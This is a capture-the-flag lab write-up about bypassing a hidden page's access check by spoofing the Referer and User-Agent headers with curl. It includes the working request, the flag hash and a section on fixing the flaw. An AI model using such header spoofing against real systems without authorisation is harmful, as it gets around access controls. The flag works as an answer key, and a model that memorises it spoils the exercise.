# Spoof (curl) — Writeup

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Mechanism

There is a hidden footer link (`© BornToSec`) pointing to a hash-named page:

```
?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

Opened normally, the page shows nothing. HTML comments on `?page=survey` (visible only in View Page Source) give the hints:

```html
<!-- You must come from : "https://www.nsa.gov/". -->
<!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
```

The server checks two request headers — `Referer` and `User-Agent` — against fixed strings. Both headers are fully controlled by the client and are not verified in any way, so this is classic **HTTP header spoofing**: an access decision based on data the attacker can set freely. A browser sets these headers itself, so `curl` is used to send them explicitly.

## Reproduction

```bash
curl -H "Referer: https://www.nsa.gov/" \
     -H "User-Agent: ft_bornToSec" \
     "http://<IP>/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

The server returns the flag.

## Fix

- Do not use `Referer`/`User-Agent` as an access control. Both are client-controlled and prove nothing about where a request really came from.
- To verify request origin, use server-side sessions with signed tokens (a CSRF token tied to the session), not string comparison of headers.
- If these headers are used for analytics or soft checks, document that they are not a security control and never gate sensitive data or functions on them.

## Benefit

The attacker reaches a page that is meant to be reachable only "from a specific site with a specific browser" by sending two header lines. If a real system used this pattern to protect an API or an admin function, it would be bypassed with a single `curl` command — full access to something that was supposed to be restricted, with no credentials.

## Flag comparison

Flag obtained through exploitation:

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

Compared byte-for-byte with the `flag` file in the submission folder during the defense.
